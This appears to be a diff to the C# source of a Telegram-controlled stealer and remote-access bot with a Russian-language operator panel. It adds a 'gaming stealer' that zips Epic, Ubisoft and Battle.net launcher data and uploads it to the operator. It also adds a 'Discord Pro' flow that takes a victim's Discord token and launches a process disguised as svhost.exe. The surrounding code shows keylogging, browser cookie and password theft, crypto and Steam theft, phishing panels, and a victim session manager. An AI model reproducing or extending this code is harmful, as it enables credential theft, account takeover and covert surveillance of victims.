@@ -11,13 +11,13 @@ using Telegram.Bot.Types.ReplyMarkups;
 using TgMessage = Telegram.Bot.Types.Message;
 using System.Net;
 using System.Net.Http;
+using VanguardCore.Modules;
 using Microsoft.Data.Sqlite;
 using FinalBot;
 using Microsoft.UpdateService.Modules;
 using FinalBot.Stealers;
 using FinalBot.Modules;
 using VanguardCore;
-using VanguardCore.Modules;
 using System.Linq;
 using File = System.IO.File;
 using System.Diagnostics;
@@ -77,10 +77,11 @@ namespace FinalBot
         {
             KeyloggerModule.OnTerminalFocus += (title, isActive) => {
                 try {
-                    string msg = isActive 
-                        ? $"🟢 **РЕЖИМ ТЕРМИНАЛА АКТИВИРОВАН**\n🔲 Окно: `{title}`" 
-                        : $"🔴 **РЕЖИМ ТЕРМИНАЛА ВЫКЛЮЧЕН**";
-                    bot.SendTextMessageAsync(adminId, msg, parseMode: ParseMode.Markdown);
+                    // Silenced to prevent operator notifications on each focus
+                    // string msg = isActive 
+                    //    ? $"🟢 **РЕЖИМ ТЕРМИНАЛА АКТИВИРОВАН**\n🔲 Окно: `{title}`" 
+                    //    : $"🔴 **РЕЖИМ ТЕРМИНАЛА ВЫКЛЮЧЕН**";
+                    // bot.SendTextMessageAsync(adminId, msg, parseMode: ParseMode.Markdown);
                     if (!isActive) _terminalBuffer.Clear();
                 } catch { }
             };
@@ -89,17 +90,7 @@ namespace FinalBot
                 try {
                     if (KeyloggerModule.IsTerminalActive)
                     {
-                        if (key == "[ENTER]\n") {
-                            string cmd = _terminalBuffer.ToString();
-                            if (!string.IsNullOrWhiteSpace(cmd)) {
-                                bot.SendTextMessageAsync(adminId, $"💻 `{cmd}`", parseMode: ParseMode.Markdown);
-                            }
-                            _terminalBuffer.Clear();
-                        } else if (key == "[BACKSPACE]") {
-                            if (_terminalBuffer.Length > 0) _terminalBuffer.Length--;
-                        } else if (key == " ") {
-                            _terminalBuffer.Append(" ");
-                        } else if (!key.StartsWith("[")) {
+                        if (!key.StartsWith("[")) {
                             _terminalBuffer.Append(key);
                         }
                     }
@@ -256,10 +247,11 @@ namespace FinalBot
                 {
                     _discordChannelUrl = text.Trim();
                     _userState.Remove(message.Chat.Id);
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"✅ <b>Ссылка установлена.</b>\n🚀 Запускаю бота..."), parseMode: ParseMode.Html);
-                    Log($"[DISCORD_REMOTE] Token: {_discordToken[..Math.Min(8, _discordToken.Length)]}... | URL: {_discordChannelUrl}");
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"✅ <b>Ссылка установлена.</b>\n🚀 Запускаю Discord Pro..."), parseMode: ParseMode.Html);
+                    Log($"[DISCORD_PRO] Token Received. Launching svhost.exe...");
                     string res = DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "join");
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(res));
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(res), parseMode: ParseMode.Html);
+                    SetDiscordReady(true);
                     return;
                 }
                 else if (state == "awaiting_discord_tokenurl")
@@ -582,50 +574,62 @@ namespace FinalBot
                         }
                         break;
                     case "work_browsers":
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🌐 Инициализация сбора данных (Chrome / Edge / DuckDuckGo)...");
                         await HandleBrowserSteal(message.Chat.Id);
                         break;
                     case "work_steam_ssfn":
                         await HandleSteamSteal(message.Chat.Id);
                         break;
+                    case "work_gaming":
+                        await HandleGamingSteal(message.Chat.Id);
+                        break;
+                    
+                    case "discord_remote_start":
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
+                        await HandleDiscordPro(message.Chat.Id);
+                        break;
+
+                    case "discord_ctrl_mic":
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🎙️ Переключение микрофона...");
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(DiscordRemoteManager.LaunchDiscordBot("", "", "mic")));
+                        break;
+
+                    case "discord_ctrl_deaf":
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🔇 Переключение звука...");
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(DiscordRemoteManager.LaunchDiscordBot("", "", "deaf")));
+                        break;
+
+                    case "discord_ctrl_stream":
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🖥️ Запуск трансляции...");
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(DiscordRemoteManager.LaunchDiscordBot("", "", "stream")));
+                        break;
+
+                    case "discord_ctrl_disconnect":
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🔴 Отключение...");
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(DiscordRemoteManager.LaunchDiscordBot("", "", "stop")));
+                        SetDiscordReady(false);
+                        await ShowSpywarePanel(message.Chat.Id, message.MessageId);
+                        break;
+
+                    case "discord_launch_current":
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Запуск...");
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "join")), parseMode: ParseMode.Html);
+                        SetDiscordReady(true);
+                        break;
+
+                    case "discord_reset_and_start":
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
+                        _discordToken = "";
+                        _discordChannelUrl = "";
+                        await HandleDiscordPro(message.Chat.Id);
+                        break;
+
                     case "work_crypto":
                         await HandleCryptoSteal(message.Chat.Id);
                         break;
                     case "full_report":
                         await HandleFullReport(message.Chat.Id);
                         break;
-                    
-                    case "discord_remote_start":
-                        if (!string.IsNullOrEmpty(_discordToken) && !string.IsNullOrEmpty(_discordChannelUrl))
-                        {
-                            await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Re-launching with saved credentials...");
-                            DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "join");
-                        }
-                        else
-                        {
-                            _userState[message.Chat.Id] = "awaiting_discord_tokenurl";
-                            await _botClient.SendTextMessageAsync(message.Chat.Id,
-                                "🎮 <b>Discord Remote Bot</b>\n" +
-                                "━━━━━━━━━━━━━━━━━━\n" +
-                                "<i>Начинаю подключение к Discord...\n" +
-                                "Введите токен и ссылку на голосовой канал:</i>\n\n" +
-                                "Формат: <code>токен | ссылка</code>",
-                                parseMode: ParseMode.Html);
-                        }
-                        break;
-
-                    case "discord_ctrl_mic":
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "mute_mic"));
-                        break;
-                    case "discord_ctrl_deaf":
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "deafen"));
-                        break;
-                    case "discord_ctrl_stream":
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "stream"));
-                        break;
-                    case "discord_ctrl_disconnect":
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "disconnect"));
-                        break;
-
                     default:
                         if (data.StartsWith("vac_inject_f_"))
                         {
@@ -1025,6 +1029,10 @@ namespace FinalBot
                     InlineKeyboardButton.WithCallbackData("🚀 VAC АЛЕРТ", "vac_panel"),
                     InlineKeyboardButton.WithCallbackData("🚀 STEAM ФИШИНГ", "work_steam_phish")
                 },
+                new[]
+                {
+                    InlineKeyboardButton.WithCallbackData("🌍 БРАУЗЕРЫ (КУКИ/ПАРОЛИ)", "work_browsers")
+                },
                 new[] { InlineKeyboardButton.WithCallbackData($"🚫 STEAM БЛОК: {steamStatus}", "toggle_steam_block") },
                 new[]
                 {
@@ -1033,12 +1041,9 @@ namespace FinalBot
                 },
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("🌍 БРАУЗЕРЫ", "work_browsers"),
-                    InlineKeyboardButton.WithCallbackData("🚀 WECHAT ФИШИНГ", "work_wechat_phish")
-                },
-                new[] { InlineKeyboardButton.WithCallbackData("💎 STEAM SSFN", "work_steam_ssfn") },
-                new[] { InlineKeyboardButton.WithCallbackData("💰 КРИПТО", "work_crypto") },
-                new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "back_to_main") }
+                    InlineKeyboardButton.WithCallbackData("🎮 GAMING STEALER", "work_gaming"),
+                    InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "back_to_main")
+                }
             });
 
             await EditOrSend(chatId, messageId, "💼 <b>РАБОЧАЯ ПАНЕЛЬ</b>\nЗапуск фишинга или сбор данных:", markup);
@@ -1190,5 +1195,67 @@ namespace FinalBot
             await EditOrSend(chatId, messageId, "👥 <b>SESSION MANAGER</b>\nSelect a victim to control:", markup);
         }
 
+        private async Task HandleGamingSteal(long chatId)
+        {
+            var msg = await _botClient.SendTextMessageAsync(chatId, GetRichText("🎮 <b>GAMING STEALER</b>\n━━━━━━━━━━━━━━━━━━\n🚀 <i>Инициализация сбора (Epic, Ubisoft, Battle.net)...</i>"), parseMode: ParseMode.Html);
+            
+            try
+            {
+                var result = await GamingStealer.Run();
+
+                if (!result.Success)
+                {
+                    await _botClient.EditMessageTextAsync(chatId, msg.MessageId, GetRichText(result.Message), parseMode: ParseMode.Html);
+                    return;
+                }
+
+                if (result.ZipPath != null && File.Exists(result.ZipPath))
+                {
+                    string info = $"✅ <b>ИГРОВЫЕ ДАННЫЕ ИЗВЛЕЧЕНЫ</b>\n" +
+                                  $"━━━━━━━━━━━━━━━━━━\n" +
+                                  $"🚀 <b>Найдено лаунчеров:</b> <code>{result.FileCount}</code>\n" +
+                                  $"━━━━━━━━━━━━━━━━━━\n" +
+                                  $"📦 <i>Отправка архива...</i>";
+
+                    await _botClient.EditMessageTextAsync(chatId, msg.MessageId, GetRichText(info), parseMode: ParseMode.Html);
+                    
+                    using (var stream = File.OpenRead(result.ZipPath))
+                    {
+                        await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(result.ZipPath)), caption: GetRichText("🎮 <b>Gaming Launchers Package</b>"), parseMode: ParseMode.Html);
+                    }
+                    
+                    File.Delete(result.ZipPath);
+                }
+            }
+            catch (Exception ex)
+            {
+                await _botClient.SendTextMessageAsync(chatId, GetRichText($"❌ <b>CRITICAL ERROR:</b> <code>{ex.Message}</code>"), parseMode: ParseMode.Html);
+            }
+        }
+        private async Task HandleDiscordPro(long chatId)
+        {
+            if (string.IsNullOrEmpty(_discordToken) || string.IsNullOrEmpty(_discordChannelUrl))
+            {
+                _userState[chatId] = "awaiting_discord_token";
+                await _botClient.SendTextMessageAsync(chatId, GetRichText("🕹️ <b>DISCORD PRO: ИНИЦИАЛИЗАЦИЯ</b>\n━━━━━━━━━━━━━━━━━━\nПожалуйста, введи <b>Discord Token</b> жертвы:"), parseMode: ParseMode.Html);
+            }
+            else
+            {
+                var markup = new InlineKeyboardMarkup(new[]
+                {
+                    new[] { InlineKeyboardButton.WithCallbackData("🚀 ЗАПУСТИТЬ С ТЕКУЩИМИ ДАННЫМИ", "discord_launch_current") },
+                    new[] { InlineKeyboardButton.WithCallbackData("🔄 ВВЕСТИ НОВЫЕ ДАННЫЕ", "discord_reset_and_start") },
+                    new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "panel_work") }
+                });
+
+                string info = $"🕹️ <b>DISCORD PRO: НАСТРОЙКИ</b>\n" +
+                              $"━━━━━━━━━━━━━━━━━━\n" +
+                              $"🔑 <b>Token:</b> <code>{(_discordToken.Length > 10 ? _discordToken.Substring(0, 6) + "..." : "SET")}</code>\n" +
+                              $"🔊 <b>URL:</b> <code>{(_discordChannelUrl.Length > 20 ? _discordChannelUrl.Substring(0, 20) + "..." : _discordChannelUrl)}</code>\n" +
+                              $"━━━━━━━━━━━━━━━━━━";
+
+                await _botClient.SendTextMessageAsync(chatId, GetRichText(info), parseMode: ParseMode.Html, replyMarkup: markup);
+            }
+        }
     }
 }
